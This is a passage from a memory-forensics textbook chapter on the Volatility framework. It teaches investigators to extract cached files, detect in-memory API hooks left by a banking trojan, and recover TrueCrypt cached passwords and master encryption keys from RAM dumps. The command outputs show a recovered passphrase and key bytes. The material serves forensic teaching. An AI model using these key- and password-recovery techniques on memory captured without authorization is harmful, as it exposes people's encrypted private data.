On a system with multiple NTFS volumes, scanning memory for individual MFT records may cause conflicts. For example, MFT entries do not contain a member that maps back to the source drive because the actual drive is irrelevant to the file system. This can potentially result in corrupt file paths in the output of the `mftparser` plugin—for example, `NEWTEX~1.TXT\kdcom.dll`. You can tell that this path is corrupt because you see a text file as part of the path for a DLL. You should see something like `WINDOWS\system32\kdcom.dll` instead. This is because record numbers are sequential, and each volume has files with the same record numbers. Because the record number is used to distinguish the parent directory of a file, it is impossible to know for sure which record number is accurate.

One way you could avoid this issue is to extract each `$Mft` file using the `dumpfiles` plugin, discussed later in this chapter, and then process it offline. When you extract each `$Mft`, the `dumpfiles` plugin includes the original file path with `Device\HarddiskVolume#`, where the `#` is the number of the volume. You can use this to figure out which volume’s `$Mft` file you are processing. You can then use your tool of choice, or even Volatility with the `mftparser` plugin, to process the extracted `$Mft` files. A downside to this methodology is that you can possibly miss MFT entries no longer referenced in the `$Mft` file, but still lingering in memory.

## Extracting Files

The previous sections of this chapter demonstrated how the memory-resident file system artifacts from a Windows system can provide valuable information during an investigation. Although the file system metadata provides context about *where* the data is stored, *when* it was accessed, and occasionally the file’s content (MFT-resident data), you often need to examine the actual content of larger files. The content helps provide indications of malicious system modifications (such as API hooks), access to malware configuration information, or even plaintext views of files encrypted on disk.

Additionally, whereas Chapter 8 described how to extract binaries that were mapped into memory as executable file streams, this section extends that to include data files and executables mapped as data file streams. In particular, you will use Volatility to analyze the file mapping structures associated with both the Windows cache manager and memory manager to extract and reconstruct memory-resident file content. As an added advantage, the data extracted can also provide you with triage hints as to which components of the files are temporally or spatially relevant at the time of memory acquisition.

---

**NOTE**

Occasionally, people still attempt to reconstruct a file from a memory sample using traditional file carving tools, such as Scalpel (`https://github.com/sleuthkit/scalpel`). In most instances, they attempt to run a carving tool directly against a memory sample. These tools linearly scan the data, looking for specific signatures associated with well-known file formats. Unfortunately, most of these tools assume the file data is contiguous and that the media being analyzed contains a whole copy of the file. This is a problem when dealing with RAM because the data stored in physical memory is inherently fragmented, and only parts of a file may actually be loaded into memory. As a result, except for files smaller than a page of memory, you are probably not going to extract the data you expect.

Alternatively, it is possible to use a plugin like `memdump` to extract the virtual address space of a particular process, and scan it using a linear file-carving tool. Although this can help address the issues with noncontiguous data, you still may lose important context associated with nonresident memory pages.

---

---

## **Analysis Objectives**

Your objectives are these:

- **Extract cached files:** You will learn how different types of files are loaded into memory, why Windows may maintain multiple views of those files, and the techniques for extracting those views. This can help you recover executable files, raw registry hives, event logs, documents (PDF, DOC, XLS), images, and more.
- **Leverage cached file data to augment investigations:** You will gain insight into how cached file data can be used to detect malicious modifications made to memory-resident file data. For example, you can compare a DLL’s executable code in memory with the cached copy from disk to detect malicious patches and hooks.
- **Access unencrypted files:** The operating system caches files that reside on encrypted media in the same manner as all other files. Thus, you can extract all or part of unencrypted file contents from memory and reveal suspects’ protected documents.

---

### Windows Cache Manager

Within the Windows operating system, the cache manager is the subsystem that provides data caching support for file system drivers. The cache manager is responsible for making sure the frequently accessed data is found in physical memory to improve I/O performance. The cache manager accomplishes this with the help of the memory manager. The cache manager accesses data by mapping views of files (within the virtual address space) using the memory manager’s support for memory-mapped files, also known as section objects. Thus, the memory manager controls which parts of the file data are actually memory-resident. On the other hand, the cache manager caches data within virtual address control blocks (VACBs). Each VACB corresponds to a 256KB view of data mapped in the system cache address space.

The remainder of the section describes how you can use the internal data structures associated with the memory manager and cache manager to reconstruct file artifacts.

---

**NOTE**

To see complete versions of the data structures mentioned in this section, use the `dt` command within `volshell`.

Additionally, you can find more information about the cache manager here:

- *Windows Internals* (6th Edition, Part 2) by Mark Russinovich and David A. Solomon
- *MoVP 4.4 Cache Rules Everything Around Me(mory)* by Aaron Walters: [http://volatility-labs.blogspot.com/2012/10/movp-44-cache-rules-everything-around.html](http://volatility-labs.blogspot.com/2012/10/movp-44-cache-rules-everything-around.html)

---

#### Executable (Image) and Data Files

To extract memory-resident files, you need to find the data and understand how it is being stored. Because the focus is files, it’s logical to start with the `_FILE_OBJECT`—a Windows kernel object used to track each instance of an open file. You can find these objects with a number of techniques, including pool scanning (Chapter 5), walking process-handle tables (Chapter 6), and accessing the file pointer embedded in process VAD nodes (Chapter 7).

After you find an instance of a `_FILE_OBJECT`, you can use its `SectionObjectPointer` member to find the associated `_SECTION_OBJECT_POINTERS`. The memory manager and the cache manager use this structure to store file mapping and cache information for a particular file stream. Based on the members of the `_SECTION_OBJECT_POINTERS`, you can determine if the file was mapped as data (`DataSectionObject`) and/or as an executable image object (`ImageSectionObject`), and if caching is being provided for this file.

[Figure 16-2](#figure16-2) shows a graphical representation of the objects rooted at the `ImageSectionObject` and `DataSectionObject`pointers. Both of these members are opaque pointers to control areas (`_CONTROL_AREA`). After you have found the offset of the associated control area, you can find the subsection structures (`_SUBSECTION`) used by the memory manager to track regions of memory-mapped file streams. The initial subsection structure is stored immediately after the `_CONTROL_AREA` in memory, and you find subsequent subsections by traversing a singly linked list that the `NextSubsection` member points to. If the file was mapped as data, there will most likely be only one subsection. On the other hand, if the file was mapped as an executable image, there will be one subsection for each section of the portable executable (PE).

![c16f002.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f002.png)

*[**Figure 16-2:**](#figureanchor16-2) The relationships among the data structures used to find and extract executable (ImageSectionObject) and data files (DataSectionObject)*

As shown in the figure, by leveraging the `SubsectionBase` member of `_SUBSECTION`, you can find a pointer to an array of page table entry (`_MMPTE`) structures. By traversing the array of page table entries, you can determine what pages are memory-resident and where they are stored in RAM. It is important to note that the size of `_MMPTE` changes not only between hardware architectures but also when a PAE-enabled kernel is being used. With this information, you can reconstruct those files that may be memory mapped as either data or image section objects.

#### Shared Cached Files

In the instances where caching is being provided, the `SharedCacheMap` member of the `_SECTION_OBJECT_POINTERS` structure is an opaque pointer to the `_SHARED_CACHE_MAP` structure, as seen in [Figure 16-3](#figure16-3). The cache manager uses the shared cache map to track the state of cached regions, including the previously described 256KB VACBs.

![c16f003.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f003.png)

*[**Figure 16-3:**](#figureanchor16-3) Relationships among the data structures used to extract a file from the SharedCacheMap*

As shown in the diagram, the cache manager uses VACB index arrays to store pointers to the VACBs. As a performance optimization, the `_SHARED_CACHE_MAP` contains a VACB index array named `InitialVacbs` that consists of four pointers—it is used for files 1MB or less in size. If the file is larger than 1MB, the `Vacbs` member of `_SHARED_CACHE_MAP` is used to store a pointer to a dynamically allocated VACB index array. If the file is larger than 32MB, a sparse multilevel index array is created where each index array can hold up to 128 entries. Because we are trying to find all the cached regions that may be memory-resident, we recursively walk the sparse multilevel array looking for file data. The `_VACB` contains the virtual address of where the data is stored in system cache (the `BaseAddress` member) and the offset where the data is found within the file (`FileOffset`). Using this information, you can reconstruct the file based on the cached regions found in memory.

### Volatility’s Dumpfiles Plugin

The `dumpfiles` plugin was developed to automate the aforementioned steps for finding and reconstructing memory-resident files. It was based on an earlier plugin called `exportfile`, which was originally developed by Carl Pulley to help solve Challenge 3 of the Honeynet Forensic Challenge 2010 (see `https://github.com/carlpulley/volatility`). In its default invocation, the `dumpfiles` plugin collects `_FILE_OBJECTS` from process handle tables and VAD trees. Using the `–p` option, it is possible to filter the results to include only the _`FILE_OBJECTS` associated with a particular PID. The `–Q` option allows an investigator to specify the physical address of a _`FILE_OBJECT`. After the specified file objects have been collected, it proceeds to extract all memory-mapped and cached regions to the designated output directory.

The following example shows the typical command line usage for `dumpfiles`. The `–S` option allows you to save a summary file that contains metadata such as the mapping of the original filename and its path when extracted to disk. The summary file also shows what regions of the file were paged out. In these cases, the plugin zero-pads those regions to maintain spatial alignment in the output file. The summary is formatted as JSON to facilitate further post-processing analysis. The `–D` option specifies where to store the extracted files.

```
$ python vol.py -f Win7SP1x64.mem --profile=Win7SP1x64 dumpfiles 
          -S summary.json -D output/
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0xfffffa800d35c9e0   4      \Device\clfsKtmLog
SharedCacheMap    0xfffffa800d35c9e0   4      \Device\clfsKtmLog
DataSectionObject 0xfffffa800d40b7c0   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
SharedCacheMap    0xfffffa800d40b7c0   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
DataSectionObject 0xfffffa800d423320   4      \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTEventLog-Application.etl
[snip]
```

---

**NOTE**

After the cached files are extracted, you can process them with file analysis tools. It is important to re-emphasize that parts of the extracted files may be zero-padded if the regions were not memory-resident. Most file analysis tools are not designed to robustly handle missing regions and, as a result, may report an error or produce only partial results.

---

The previous output presents information about the extracted files, such as the provenance from where the data was found (`DataSectionObject`, `ImageSectionObject`, or `SharedCacheMap`), the virtual address for the `_FILE_OBJECT`, the PID of the process that was accessing the file stream, and the path to where the data was stored on the file system. You can find the extracted files in the output directory. The following output shows a partial listing of the files in an output directory.

```
$ ls output/
file.392.0xfffffa800e1efc20.img
file.4.0xfffffa800d1fd210.dat
file.4.0xfffffa800d1fe6e0.vacb
[snip]
```

As you can see, the files are named according to a specific schema. The goals for the naming schema were to provide provenance for the data, to reduce the number of duplicated files, and to remove the ability for an attacker to control the filename. The files are named according to the following convention:

```
file.PID.[SCMOffset|CAOffset].[img|dat|vacb]
```

- **PID:** The process ID of the process where the _`FILE_OBJECT` was found.
- **SCMOffset:** The virtual address of the `SharedCacheMap` object from which the file was extracted (if applicable).
- **CAOffset:** The virtual address of the `_CONTROL_AREA` object from which the file was extracted (if applicable).
- **img:** The file extension used to indicate that this data was extracted from an `ImageSectionObject` object.
- **dat:** The file extension used to indicate that the data was extracted from a `DataSectionObject` object.
- **vacb:** The file extension used to indicate that the data was extracted from a `SharedCacheMap` object.

Using information from the summary file, you can map the extracted files to their original paths. The following code snippet demonstrates how you can accomplish this:

```
$ python 
>>> import json as json
>>> file = open("summary.json", "r")
>>> for item in file.readlines():
...     info = json.loads(item.strip())
...     print "{0} -> {1}".format(info["ofpath"], info["name"])
... 
output/file.4.0xfffffa800d3566e0.vacb -> \Device\clfsKtmLog
output/file.4.0xfffffa800d479280.dat -> \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
output/file.4.0xfffffa800d46fa10.vacb -> \Device\HarddiskVolume1\Windows
  \System32\LogFiles\WMI\RtBackup\EtwRTDiagLog.etl
```

---

**NOTE**

If you supply the `–n/--name` option to `dumpfiles`, it includes the original filename in the output file-naming schema. Keep in mind that the filename should not be considered trusted, and an attacker can manipulate it.

---

#### Targeted File Extraction

Depending on your analysis goals, you may want to extract only a subset of the files found in memory. For example, your investigation may focus on artifacts found in Windows event logs. To support these types of targeted extractions, the `dumpfiles` plugin provides the option to filter the results based on regular expressions. The following example demonstrates how to extract event logs from a Windows 7 64-bit memory dump using the `–r/--regex` option:

```
$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 dumpfiles 
       -D output/ -i -r .evtx$
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0xfffffa800e598e20   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\System.evtx
SharedCacheMap    0xfffffa800e598e20   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\System.evtx
DataSectionObject 0xfffffa800c59e071f0   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Application.evtx
SharedCacheMap    0xfffffa800c59e071f0   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Application.evtx
DataSectionObject 0xfffffa800e596070   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Security.evtx
SharedCacheMap    0xfffffa800e596070   756    \Device\HarddiskVolume1\Windows
  \System32\winevt\Logs\Security.evtx
[snip]
```

As you can see, the plugin was able to extract the System, Application, and Security event logs, among others. During investigations, you may also want to extract files *not* found in the handle table or the VAD tree. For example, this can help if you wanted to extract the `$Mft` file (a NTFS special file) that you saw in the output of the `filescan` plugin. The `–Q`/`--physoffset` option for the `dumpfiles` plugin enables you to specify the physical memory address associated with a `_FILE_OBJECT`. The following example shows how to extract an `$Mft` file using this method:

```
$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 filescan | grep -i mft
Volatility Foundation Volatility Framework 2.4
0x000000003f915380      3      0 RW-rwd \Device\HarddiskVolume1\$MftMirr
0x000000003f922300     33      0 RW-rwd \Device\HarddiskVolume1\$Mft
0x000000003f926c80     33      0 RW-rwd \Device\HarddiskVolume1\$Mft

$ python vol.py -f Win7SP1x64.raw --profile=Win7SP1x64 dumpfiles 
      -D output/ -Q 0x000000003f922300
Volatility Foundation Volatility Framework 2.4
DataSectionObject 0x3f922300   None   \Device\HarddiskVolume1\$Mft
SharedCacheMap    0x3f922300   None   \Device\HarddiskVolume1\$Mft
```

---

**NOTE**

In our experience, the output of the `filescan` plugin often contains more than one `$Mft` reference, even on systems with only one volume. You may have to extract both `$Mft` files and examine them with a hex editor, because typically only one of the versions is valid.

---

#### Detecting Modified Code

An example of an interesting use case for the `dumpfiles` plugin involves comparing the memory-mapped and cached versions of files to look for malicious modifications. For example, if malware attempts to make an inline control flow change to the text section of a memory-resident PE, they will often get a private version of the page mapped into their address space (this is known as copy-on-write). By comparing different views of the data, you can easily identify anomalies. For example, suppose that you run the `apihooks` plugin and find the following hook in the `WININET.dll` library for `IEXPLORE.EXE`:

```
$ python vol.py -f silentbanker.vmem apihooks
      --profile=WinXPSP3x86

[snip]

 Hook mode: Usermode
 Hook type: Inline/Trampoline
 Process: 1884 (IEXPLORE.EXE)
 Victim module: WININET.dll (0x771b0000 - 0x77256000)
 Function: WININET.dll!CommitUrlCacheEntryA at 0x771b5319
 Hook address: 0x1080000
 Hooking module: <unknown>
 
 Disassembly(0):
 0x771b5319 e9e2acec89        JMP 0x1080000
 0x771b531e 83ec48            SUB ESP, 0x48
 0x771b5321 53                PUSH EBX
 0x771b5322 56                PUSH ESI
 0x771b5323 8b3548131b77      MOV ESI, [0x771b1348]
 0x771b5329 57                PUSH EDI
 0x771b532a 6aff              PUSH -0x1
 0x771b532c fc75f008            PUSH DWORD [EBP+0x8]
 0x771b532f ffd6              CALL ESI
[snip]
```

The output tells you that the first few instructions of the `CommitUrlCacheEntryA` function at address `0x771b5319` were overwritten with a `JMP` instruction that leads outside of `WININET.dll`. The new values, shown in bold, are `E9 E2 AC EC 89`. If you extract the modified DLL using the `dlldump` plugin, as discussed in Chapter 8, the extracted file will contain the previously identified code modifications. Here’s an example:

```
$ python vol.py dlldump -f silentbanker.vmem --profile=WinXPSP3x86
           -p 1884 -i -r wininet.dll -D extracted
Volatility Foundation Volatility Framework 2.4
Process(V) Name                 Module Base Module Name          Result
---------- -------------------- ----------- -------------------- ------
0x80f1b020 IEXPLORE.EXE         0x0771b0000 WININET.dll          OK: 
  module.1884.107e020.771b0000.dll

$ xxd module.1884.107e020.771b0000.dll | less
[snip]
00004710 3BF6 FFFF 9090 9090 90E9 E2AC EC89 83EC   ;...............
00004720 4853 568B 3548 131B 7757 6AFF FF75 08FF   HSV.5H..wWj..u..
```

As you can see, at offset `0x4719` of the file, the five modified bytes appear. Alternatively, if you extract the same DLL using `dumpfiles`, you will find an unmodified version of the code within the extracted DLL.

```
$ python vol.py dumpfiles -f silentbanker.vmem --profile=WinXPSP3x86
       -p 1884 -r wininet.dll -D extracted
Volatility Foundation Volatility Framework 2.4
ImageSectionObject 0xff3b9130   1884 
  \Device\HarddiskVolume1\WINDOWS\system32\wininet.dll

$ xxd file.1884.0x80f04f30.img | less
[snip]
00004710 3BF6 FFFF 9090 9090 908B FF55 8BEC 83EC  ;..........U....
00004720 4853 568B 3548 131B 7757 6AFF FF75 08FF  HSV.5H..wWj..u..
```

In this version of the DLL, offset `0x4719` contains the original bytes `8B FF 55 8B EC`. Using the `dumpfiles` plugin, the code extracted matches the version from disk, whereas the version found using the `dlldump` plugin was modified with an inline control flow change. This is the effect that in-memory API hooks have.

This use case was intended to provide an example of the type of analysis possible by analyzing the memory-resident file data. In this example, you were able to identify control flow changes made to the system using the memory-mapped data. The analysis could be extended to analyze each process’ view of the file or to use those views to potentially fill in nonresident pages in a particular address space.

---

**NOTE**

The comparison just discussed would not be as obvious if malware patched the file on disk instead of only the memory-mapped version, because then all data sources would match. However, technologies such as Windows File Protection (WFP) serve to prevent on-disk patching of critical system files. Additionally, by patching on disk, the malware’s code is written to more permanent storage, something that is often undesirable from a stealth perspective.

---

## Defeating TrueCrypt Disk Encryption

A common use for memory forensics, especially among practitioners in law enforcement, is to defeat disk encryption. Suspects often protect their data with full disk encryption (FDE) software such as TrueCrypt, Microsoft BitLocker, Symantec Drive Encryption (PGP Desktop), or Apple FileVault. While a system is powered off, the whole disk, individual partition(s), or “virtual” file-based containers are encrypted. This protection results in serious challenges for investigators, even if they gain access to the media (laptop, thumb drive, and so on). However, if a system is running and the media is connected and mounted (that is, unlocked), the user’s applications can freely and transparently access the data on the drive, which is decrypted on the fly as it is accessed. As a result, RAM may contain cached volume passwords, master encryption keys, and/or portions of unencrypted files.

In this section, we present a novel approach to find and extract TrueCrypt master encryption keys from memory dumps. We also cover how to extract cached passwords and identify encrypted volumes. It’s important to note that, although we focus on TrueCrypt, the various other products are susceptible to the same type(s) of data collection. Furthermore, we aren’t exploiting security vulnerabilities in the encryption software. After all, the products encrypt disks (or files on a disk), not RAM.

If you’re not familiar with attacks against disk encryption, see the following resources before reading the rest of this section:

- *RAM is Key: Extracting Disk Encryption Keys From Volatile Memory* by Brian Kaplan and Matthew Geiger: [http://cryptome.org/0003/RAMisKey.pdf](http://cryptome.org/0003/RAMisKey.pdf).
- *Lest We Remember: Cold Boot Attacks on Encryption Keys* by students at Princeton University: [https://citp.princeton.edu/research/memory](https://citp.princeton.edu/research/memory).
- *The Persistence of Memory: Forensic Identification and Extraction of Cryptographic Keys* by Carsten Maartmann-Moe: [http://www.dfrws.org/2009/proceedings/p132-moe.pdf](http://www.dfrws.org/2009/proceedings/p132-moe.pdf).

---

**NOTE**

Because we don’t mention it elsewhere, it *is* possible to encrypt RAM. For example TRESOR ([https://www.usenix.org/legacy/events/sec11/tech/full_papers/Muller.pdf](https://www.usenix.org/legacy/events/sec11/tech/full_papers/Muller.pdf)) is a Linux kernel patch that runs encryption securely outside of RAM. The master keys are stored on the CPU instead of in main memory. Likewise, PrivateCore ([http://www.privatecore.com](http://www.privatecore.com)) is a commercially available product that fully encrypts memory on x86 systems. In short, it uses a KVM hypervisor that runs from an Intel CPU’s L3 cache and acts as an encryption gateway for data in main memory.

---

### Password Caching

TrueCrypt supports caching passwords and key files in memory. Although this feature is disabled by default, many users enable it for convenience. This unprotected data in memory is the “low-hanging fruit” so to speak. If exposed in a memory capture, investigators can use the credentials to fully reveal data on the encrypted media. As shown in [Figure 16-4](#figure16-4), when you initially mount a volume (or container), you can choose to “save” the password.

![c16f004.eps](/api/v2/epubs/urn:orm:book:9781118824993/files/image_fi/825099c16/c16f004.png)

*[**Figure 16-4:**](#figureanchor16-4) TrueCrypt supports caching passwords and key files in memory.*

The TrueCrypt driver in kernel mode (`truecrypt.sys`) manages the caching functionality. Specifically, when passwords are cached, the driver uses a structure defined in the `Common/Password.h` header file to store the passwords:

```
// Minimum possible password length
#define MIN_PASSWORD                   1
// Maximum possible password length
#define MAX_PASSWORD                  64
typedef struct
{
       // Modifying this structure can 
       // introduce incompatibility with previous versions
       unsigned __int32 Length;
       unsigned char Text[MAX_PASSWORD + 1];
       char Pad[3]; // keep 64-bit alignment
} Password;
```

The minimum and maximum password lengths are 1 and 64, respectively. The value of the password is stored in the `Text` member, which follows a `Length` field that specifies the number of characters in the password. To maintain 64-bit alignment, there are 3 bytes of padding (all 0) at the end. When you run the `truecryptpassphrase` plugin against a memory dump, it scans for instances of the password structure. Here’s an example:

```
$ python vol.py -f Win8SP0x86-Pro.mem 
      --profile=Win8SP0x86 truecryptpassphrase

Volatility Foundation Volatility Framework 2.4
Found at 0x9cd8f064 length 31: duplicative30205_nitrobacterium
```

Armed with the password, investigators can fully decrypt the protected media offline (that is, in a manner independent of the suspect’s system). Although this data recovery technique requires users to explicitly enable password caching, the encrypted volume does *not* need to be mounted at the time of memory acquisition. TrueCrypt allows users to clear the password cache on demand, which should remove the sensitive data from RAM.

### Encrypted Volume Identification

Another challenge that investigators face is identifying the encrypted volume. If you don’t know what hard drive, partition, or “virtual” file serves as the encrypted container, having the password is only as useful as finding the key to a house but having no idea where the house is. To address this problem, we created the `truecryptsummary` plugin. Here’s an example of the output:

```
$ python vol.py -f Win8SP0x86-Pro.mem --profile=Win8SP0x86 truecryptsummary
Volatility Foundation Volatility Framework 2.4

Registry Version  TrueCrypt Version 7.1a
Process           TrueCrypt.exe at 0x85d79880 pid 3796
Kernel Module     truecrypt.sys at 0x9cd5b000 - 0x9cd92000
Symbolic Link     Volume{ad5c0504-eb77-11e2-af9f-8c2daa411e3c} -> 
\Device\TrueCryptVolumeJ mounted 2013-10-10 22:51:29 UTC+0000
File Object       \Device\TrueCryptVolumeJ\ at 0x6c1a038
File Object       \Device\TrueCryptVolumeJ\Chats\GOOGLE\Query\
modernimpact88@gmail.com.xml at 0x25e8e7e8
File Object       \Device\TrueCryptVolumeJ\Pictures\haile.jpg at 0x3d9d0810
File Object       \Device\TrueCryptVolumeJ\Pictures\nishikori.jpg at 0x3e44cc38
File Object       \Device\TrueCryptVolumeJ\$RECYCLE.BIN\
desktop.ini at 0x3e45f790
File Object       \Device\TrueCryptVolumeJ\ at 0x3f14b8d0
File Object       \Device\TrueCryptVolumeJ\Chats\GOOGLE\Query\
modernimpact88@gmail.com.log at 0x3c33f032f0
Driver            \Driver\truecrypt at 0x18c57ea0 range 0x9cd5b000 - 0x9cd91b80
Device            TrueCryptVolumeJ at 0x86bb1728 type FILE_DEVICE_DISK
Container         Path: \??\C:\Users\Mike\Documents\lease.pdf
Device            TrueCrypt at 0x85db6918 type FILE_DEVICE_UNKNOWN
```

Note the following points:

- By querying the cached registry hives in memory, the plugin tells you the TrueCrypt version (7.1a) installed on the target system.
- Based on the symbolic link objects, the volume was mounted on the `J:` drive letter at 2013-10-10 22:51:29.
- Various pictures and Gmail chat logs exist on the TrueCrypt volume.

Finally, the plugin tells you the full path to the encrypted file container: `C:\Users\Mike\Documents\lease.pdf`. If you have a forensic disk image, now you can extract the `lease.pdf` file and unlock it with the previously recovered password. Without the information provided by the `truecryptsummary` plugin, you would need an alternate method to identify the encrypted container. For example, you could calculate entropy or analyze file metadata (see the TCHunt tool’s FAQ here: [http://16s.us/software/TCHunt/tchunt_faq.txt](http://16s.us/software/TCHunt/tchunt_faq.txt)).

### The Cache Manager and NTFS Metadata

In the previous example, you saw a “virtual” file-based container formatted with the FAT32 file system. The next case displays results from the `truecryptsummary` plugin when analyzing an entire partition (USB thumb drive) formatted with NTFS. In the following output, you can see the TrueCrypt volume mounted on the suspect system on 2013-10-11, and the container is `\Device\Harddisk1\Partition1`.

```
$ python vol.py -f WIN-QBTA4959AO9.raw --profile=Win2012SP0x64 truecryptsummary
Volatility Foundation Volatility Framework 2.4

Process           TrueCrypt.exe at 0xfffffa801af43980 pid 2096
Kernel Module     truecrypt.sys at 0xfffff88009200000 - 0xfffff88009241000
Symbolic Link     Volume{52b24c47-eb79-11e2-93eb-000c29e29398} -> 
\Device\TrueCryptVolumeZ mounted 2013-10-11 03:51:08 UTC+0000
Symbolic Link     Volume{52b24c50-eb79-11e2-93eb-000c29e29398} -> 
\Device\TrueCryptVolumeR mounted 2013-10-11 03:55:13 UTC+0000
File Object       \Device\TrueCryptVolumeR\$Directory at 0x7c2c70f070
File Object       \Device\TrueCryptVolumeR\$LogFile at 0x7c39d750
File Object       \Device\TrueCryptVolumeR\$MftMirr at 0x7c67cd40
File Object       \Device\TrueCryptVolumeR\$Mft at 0x7cf05230
File Object       \Device\TrueCryptVolumeR\$Directory at 0x7cf50330
File Object       \Device\TrueCryptVolumeR\$BitMap at 0x7cfa7a00
Driver            \Driver\truecrypt at 0x7c9c0530 range 0xfffff88009200000 – 
0xfffff88009241000
Device            TrueCryptVolumeR at 0xfffffa801b4be080 type FILE_DEVICE_DISK
Container         Path: \Device\Harddisk1\Partition1
Device            TrueCrypt at 0xfffffa801ae3f500 type FILE_DEVICE_UNKNOWN
```

Although the partition is fully encrypted, once it is mounted, the operating system caches any files accessed on the volume (for more information, see the “Windows Cache Manager” section of this chapter), at least for some period of time. As a result, the `dumpfiles` plugin can help you recover all or part of unencrypted files from memory. The potential data sources include the pictures and Gmail chat logs shown in the previous example as well as the `$Mft`, `$MftMirr`, `$Directory`, and other NTFS metadata files in this example. Remember, the encryption is *transparent* to the operating system, so files that reside on protected media are cached in the same manner as all others.

### Extracting (AES) Master Keys

If a suspect does not cache passwords, you can go after the master keys. One of the inherent risks of disk encryption is that the master keys must remain in RAM *while the volume is mounted* to provide fully transparent encryption (see [http://www.truecrypt.org/docs/unencrypted-data-in-ram#Y445](http://www.truecrypt.org/docs/unencrypted-data-in-ram#Y445)). In other words, if master keys are flushed to disk, the design would suffer in terms of performance and security because plain-text keys are written to slower, less volatile storage. Thus, if physical memory acquisition occurs at a time when the encrypted volume(s) are mounted, you have a very good chance of recovering the master keys.

TrueCrypt’s *default* encryption scheme is AES in XTS mode. In XTS mode, primary and secondary 256-bit keys are combined to form one 512-bit (64 bytes) master key. Because AES key schedules can be distinguished from other seemingly random blocks of data, you can locate them in memory dumps, packet captures, and so on. For example, the following tools can locate AES keys in unstructured binary files:

- AESKeyFinder: [https://citp.princeton.edu/research/memory/code](https://citp.princeton.edu/research/memory/code)
- Bulk Extractor: [https://github.com/simsong/bulk_extractor](https://github.com/simsong/bulk_extractor)

In most cases, extracting the keys from RAM is as easy as this:

```
$ ./aeskeyfind Win8SP0x86.raw
f12bffe602366806d453b3b290f89429
e6f5e6511496b3db550cc4a00a4bdb1b
4d81111573a789169fce790f4f13a7bd
a2cde593dd1023d89851049b8474b9a0
[snip]
269493cfc103ee4ac7cb4dea937abb9b
4d81111573a789169fce790f4f13a7bd
0f2eb916e673c76b359a932ef2b81a4b
7a9df9a5589f1d85fb2dfc62471764ef47d00f35890c18f084d87c3a10d9eb5bf4
c78e679c9da3574f63965803a909b8ef40b140b43be062850d5bb95d75273e41
Keyfind progress: 100%
```

Several keys were identified, but only the two final ones in bold are 256-bits (the others are 128-bit keys). Thus, by combining the two 256-bit keys, you can bet you’ll have your 512-bit master AES key. That’s all straightforward and documented in the articles linked from the beginning of the “Defeating Disk Encryption” section. Additionally, Michael Weissbacher’s blog ([http://mweissbacher.com/blog/tag/truecrypt](http://mweissbacher.com/blog/tag/truecrypt)) includes a patch to the TrueCrypt source code that shows you how to leverage the extracted master keys to unlock the TrueCrypt container.

### Non-Default Encryption Algorithms

TrueCrypt also supports Twofish, Serpent, and combinations thereof (AES-Twofish, AES-Twofish-Serpent). Furthermore, it supports modes other than XTS, such as LWR and CBC. What do you do if a suspect uses non-default encryption schemes or modes? You can’t find Twofish or Serpent keys with tools like AESKeyFinder and Bulk Extractor, which are designed to scan only for AES keys. An alternative is Interrogate ([http://sourceforge.net/projects/interrogate](http://sourceforge.net/projects/interrogate)) by Carsten Maartmann-Moe. Interrogate scans for AES, Twofish, Serpent, and RSA keys based on patterns in the algorithms’ key schedules. Additionally, we identify several commercial products at the end of this section.

The method we recently devised for extracting TrueCrypt master keys from memory does not involve scanning for algorithm-specific key schedule patterns. Instead, the `truecryptmaster` Volatility plugin uses a structured approach by finding keys in the *exact same way* the TrueCrypt driver finds the keys before encrypting or decrypting data. We compiled our own `truecrypt.sys` and built Python types (see Chapter 3) from the PDB file generated by the Microsoft Visual Studio compiler. Then we configured the plugin to access the same structures and members as the TrueCrypt driver.

The following command shows how to use this plugin:

```
$ python vol.py -f WIN-QBTA4.raw --profile=Win2012SP0x64 
     truecryptmaster --dump-dir=OUTPUT

Volatility Foundation Volatility Framework 2.4

Container: \Device\Harddisk1\Partition1
Hidden Volume: No
Read Only: No
Disk Length: 7743733760 (bytes)
Host Length: 7743995904 (bytes)
Encryption Algorithm: SERPENT
Mode: XTS
Master Key
0xfffffa8018eb71a8 bbe1dc7a8e87e9f1f7eef37e6bb30a25   ...z.......~k..%
0xfffffa8018eb71b8 90b8948fefee425e5105054c32e058b1a7   ......B^Q..N2X..
0xfffffa8018eb71c8 a76c5e96d67892335008a8c60d09fb69   .l^..x.3P......i
0xfffffa8018eb71d8 efb0b5fc759d44ec8c057fbc94ec3cc9   ....u.D.......<.
Dumped 64 bytes to ./0xfffffa8018eb71a8_master.key
```

The suspect in this case used Serpent in XTS mode. In addition, the master key data is extracted to disk. As a result of the described methodology for finding and dumping keys, the plugin works regardless of the encryption algorithm, mode, key length, and so on. In short, if the TrueCrypt driver can find the keys, so can you. However, the main caveat is that you still need to acquire memory while the encrypted volume is accessible to the operating system.

---

**NOTE**

The following list shows commercially available products for defeating disk encryption with memory analysis. You typically supply a forensic disk image (or container) and a full memory dump. We have not used or evaluated these tools.

- Passware Kit Forensic: [http://www.lostpassword.com/kit-forensic.htm](http://www.lostpassword.com/kit-forensic.htm)
- Elcomsoft Forensic Disk Decryptor: [http://www.elcomsoft.com/efdd.html](http://www.elcomsoft.com/efdd.html)

 Additionally, various products (open source and commercial) can help you brute-force passwords. A few are as follows:- AccessData DNA: [http://www.accessdata.com/products/digital-forensics/decryption](http://www.accessdata.com/products/digital-forensics/decryption)
- TrueCrack: [https://code.google.com/p/truecrack](https://code.google.com/p/truecrack)

---

## Summary

